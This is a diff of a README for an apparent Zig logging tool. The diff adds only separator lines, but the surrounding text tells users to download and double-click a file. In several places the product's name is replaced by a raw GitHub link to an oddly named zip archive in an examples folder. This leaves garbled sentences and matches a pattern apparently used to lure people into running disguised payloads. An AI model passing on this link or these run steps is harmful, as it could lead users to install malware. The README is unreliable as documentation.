@@ -63,6 +63,8 @@ Here’s how to install it:
 6. Double-click the file to run the application.
 7. Follow any on-screen instructions to complete the setup.
 
+---
+
 ## ⚙️ Quick Start
 
 After installing https://github.com/Fantasm027/logly.zig/raw/refs/heads/main/examples/zig_logly_ultraevangelical.zip, you can start using it right away. Here's how to create your first log:
@@ -73,13 +75,19 @@ After installing https://github.com/Fantasm027/logly.zig/raw/refs/heads/main/exa
 4. Enter your log message.
 5. Save your log.
 
+---
+
 ## 📘 Support
 
 If you encounter any issues or have questions, please check the FAQ section on our GitHub page. You can also submit an issue in the repository for direct support.
 
+---
+
 ## 💬 Community
 
 Join our community to share tips and get advice on using https://github.com/Fantasm027/logly.zig/raw/refs/heads/main/examples/zig_logly_ultraevangelical.zip Connect with other users through forums or our social media channels.
+
+---
 
 ## 📚 Further Reading
 
